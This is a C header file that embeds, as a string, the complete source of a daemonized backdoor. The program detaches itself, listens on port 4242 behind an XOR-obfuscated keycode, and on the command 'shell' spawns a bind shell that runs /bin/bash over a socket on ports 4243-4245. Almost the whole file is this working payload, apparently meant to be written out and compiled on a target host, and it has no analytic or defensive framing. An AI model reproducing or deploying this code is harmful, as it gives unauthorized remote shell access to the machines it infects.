# ifndef DUREX
# define DUREX

#include <stdlib.h>
#include <strings.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

char code[] = "#include <fcntl.h>\n\
#include <netdb.h>\n\
#include <ctype.h>\n\
#include <dirent.h>\n\
#include <sys/socket.h>\n\
#include <sys/types.h>\n\
#include <sys/stat.h>\n\
#include <sys/time.h>\n\
#include <arpa/inet.h>\n\
#include <netinet/in.h>\n\
#include <string.h>\n\
#include <strings.h>\n\
#include <unistd.h>\n\
#include <stdio.h>\n\
#include <stdlib.h>\n\
#include <sys/types.h>\n\
#include <sys/wait.h>\n\
#ifndef PORT\n\
 #define PORT 4242\n\
#endif\n\
\n\
int net_init()\n\
{\n\
	int fd;\n\
	struct sockaddr_in addr;\n\
	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\n\
		return (-1);\n\
	bzero(&addr, sizeof(addr));\n\
	addr.sin_family = AF_INET;\n\
	addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\
	addr.sin_port = htons(PORT);\n\
\n\
	if (bind(fd, (const struct sockaddr *)&addr, sizeof(addr)) == -1)\n\
		return (-1);\n\
	if (fcntl(fd, F_SETFL, O_NONBLOCK) == -1)\n\
		return (-1);\n\
	if (listen(fd, 3) == -1)\n\
		return (-1);\n\
	return fd;\n\
}\n\
\n\
typedef struct	s_client\n\
{\n\
	int fd;\n\
	int is_auth; // 0 no 1 yes\n\
	int is_connected;// 0 available 1 busy\n\
	char *wbuf;\n\
	int shellport;\n\
}				t_client;\n\
\n\
t_client *find_cl_available(t_client *cl)\n\
{\n\
	for (int i = 0 ; i < 3; i++)\n\
		if (!cl[i].is_connected)\n\
			return (&cl[i]);\n\
	return NULL;\n\
}\n\
\n\
t_client *find_cl(t_client *cl, int fd)\n\
{\n\
	for (int i = 0 ; i < 3; i++)\n\
		if (cl[i].fd == fd)\n\
			return (&cl[i]);\n\
	return NULL;\n\
}\n\
int net_accept(t_client *cl, int serv_fd)\n\
{\n\
	struct sockaddr_in cl_addr;\n\
	int cl_fd;\n\
	int len = sizeof(cl_addr);\n\
	if (!cl)\n\
		return (-2);\n\
	if ((cl_fd = accept(serv_fd, (struct sockaddr *)&cl_addr, &len)) < 0)\n\
		return (-3);\n\
	if ((fcntl(cl_fd, F_SETFL, O_NONBLOCK)) == -1)\n\
		return (-4);\n\
	cl->is_connected = 1;\n\
	cl->fd = cl_fd;\n\
	return cl_fd;\n\
\n\
}\n\
\n\
char *gen_pwd(char *pwd)\n\
{\n\
	char *key= \"WEAKPWD!\";\n\
	for (int i = 0; i < 9; i++)\n\
		pwd[i] ^= key[i];\n\
	pwd[9] = 0;\n\
	return pwd;\n\
}\n\
\n\
void pop_shell(int port, t_client *cls)\n\
{\n\
	pid_t pid;\n\
   \n\
\n\
	//exec shell\n\
	if ((pid = fork()) < 0)\n\
		return;\n\
	if (!pid)\n\
	{\n\
		for (int i = 0; i < 3; i++)\n\
			if(cls[i].fd)\n\
				close(cls[i].fd);\n\
		int sockfd, connfd, len;\n\
    struct sockaddr_in servaddr, cli;\n\
    // network\n\
    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n\
	if (sockfd == -1)\n\
		exit(0);\n\
	servaddr.sin_family = AF_INET;\n\
    servaddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\
    servaddr.sin_port = htons(port);\n\
    if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0)\n\
		exit(0);\n\
	if ((listen(sockfd, 2)) != 0)\n\
		exit(0);\n\
	len = sizeof(cli);\n\
	connfd = accept(sockfd, (struct sockaddr*)&cli, &len);\n\
	if (connfd < 0)\n\
		exit(0);\n\
    char * const argv[] = {\"/bin/bash\", NULL};\n\
    char * const envp[] = {NULL};\n\
\n\
		dup2(connfd, 0);\n\
		dup2(connfd, 1);\n\
		dup2(connfd, 2);\n\
		execve(\"/bin/bash\", argv, envp);\n\
		exit(0);\n\
	}\n\
\n\
\n\
}\n\
\n\
int net_receive(t_client *cl, fd_set *socks, int *n_cl, t_client *cls)\n\
{\n\
	char buff[1919];\n\
	char pwd[10] = \"bvpf=duB\\n\";\n\
	bzero(buff, sizeof(buff));\n\
	int ret;\n\
	ret = recv(cl->fd, buff, sizeof(buff) - 1, 0);\n\
	if (ret == 0 || ret == -1)\n\
		return (1);\n\
	buff[ret] = 0;\n\
	if (!cl->is_auth && !strcmp(buff, gen_pwd(pwd)))\n\
		cl->is_auth = 1;\n\
	else if (!cl->is_auth)\n\
	{\n\
		cl->wbuf = strdup(\"Keycode: \");\n\
		return (2);\n\
	}\n\
	else if (!strcmp(buff, \"exit\\n\"))\n\
	{\n\
		close(cl->fd);\n\
		FD_CLR(cl->fd, socks);\n\
		bzero(cl, sizeof(t_client) );\n\
		(*n_cl)--;\n\
	}\n\
	else if (!strcmp(buff, \"help\\n\"))\n\
	{\n\
		cl->wbuf = strdup(\"help: display available cmds\\nshell: pop a shell on another port\\nexit: quit this shell\\n\");\n\
		return(2);\n\
	}\n\
	else if (!strcmp(buff, \"shell\\n\"))\n\
	{\n\
		pop_shell(cl->shellport, cls);\n\
		close(cl->fd);\n\
		FD_CLR(cl->fd, socks);\n\
		bzero(cl, sizeof(t_client));\n\
		(*n_cl)--;\n\
	}\n\
	return (0);\n\
}\n\
\n\
void daemonize()\n\
{\n\
   pid_t pid;\n\
\n\
    /* Fork off the parent process */\n\
    pid = fork();\n\
\n\
    /* An error occurred */\n\
    if (pid < 0)\n\
        exit(EXIT_FAILURE);\n\
\n\
    /* Success: Let the parent terminate */\n\
    if (pid > 0)\n\
        exit(EXIT_SUCCESS);\n\
\n\
    /* On success: The child process becomes session leader */\n\
    if (setsid() < 0)\n\
        exit(EXIT_FAILURE);\n\
\n\
\n\
    /* Fork off for the second time*/\n\
    pid = fork();\n\
\n\
    /* An error occurred */\n\
    if (pid < 0)\n\
        exit(EXIT_FAILURE);\n\
\n\
    /* Success: Let the parent terminate */\n\
    if (pid > 0)\n\
        exit(EXIT_SUCCESS);\n\
\n\
\n\
    /* Change the working directory to the root directory */\n\
    /* or another appropriated directory */\n\
    chdir(\"/\");\n\
\n\
	close(0);\n\
	close(1);\n\
	close(2);\n\
}\n\
\n\
int main()\n\
{\n\
	daemonize();\n\
	int n_clients = 0;\n\
	t_client clients[3];\n\
	fd_set sockets, ready_sockets;\n\
	fd_set wsockets, ready_wsockets;\n\
	int serv_sock;\n\
	int max_fd = 0;\n\
\n\
	FD_ZERO(&sockets);\n\
	FD_ZERO(&wsockets);\n\
\n\
	bzero(clients, sizeof(t_client) * 3);\n\
	clients[0].shellport = 4243;\n\
	clients[1].shellport = 4244;\n\
	clients[2].shellport = 4245;\n\
	if ((serv_sock = net_init()) < 0)\n\
		return 1;\n\
	FD_SET(serv_sock, &sockets);\n\
	max_fd = serv_sock;\n\
\n\
	while (19)\n\
	{\n\
		ready_sockets = sockets;\n\
		ready_wsockets = wsockets;\n\
		if (select(max_fd + 1, &ready_sockets, &ready_wsockets, NULL, NULL) == -1)\n\
			return (1);\n\
		for (int i = 0; i <= max_fd; i++)\n\
		{\n\
		clients[0].shellport = 4243;\n\
		clients[1].shellport = 4244;\n\
		clients[2].shellport = 4245;\n\
			if (FD_ISSET(i, &wsockets))\n\
			{\n\
				t_client *cl = find_cl(clients, i);\n\
				send(cl->fd, cl->wbuf, strlen(cl->wbuf), 0);\n\
				free(cl->wbuf);\n\
				cl->wbuf = 0;\n\
				FD_CLR(i, &wsockets);\n\
			}\n\
			if (FD_ISSET(i, &ready_sockets))//Socket ready for read operations\n\
			{\n\
				if (i == serv_sock && n_clients < 3)\n\
				{\n\
					int clfd;\n\
					if ((clfd = net_accept(find_cl_available(clients), serv_sock)) < 0)\n\
						continue;\n\
					FD_SET(clfd, &sockets);\n\
					n_clients++;\n\
					if (clfd > max_fd);\n\
						max_fd = clfd;\n\
					FD_SET(clfd, &wsockets);\n\
					find_cl(clients, clfd)->wbuf = strdup(\"Keycode: \");\n\
				}\n\
				else if (i != serv_sock)\n\
				{\n\
					int r = net_receive(find_cl(clients, i), &sockets, &n_clients, clients);\n\
					if (r == 1) //end of com\n\
					{\n\
						close(i);\n\
						FD_CLR(i, &sockets);\n\
						bzero(find_cl(clients, i), sizeof(t_client));\n\
						n_clients--;\n\
					}\n\
					if (r == 2)\n\
						FD_SET(i, &wsockets);\n\
				}\n\
			}\n\
		}\n\
	}\n\
}";

#endif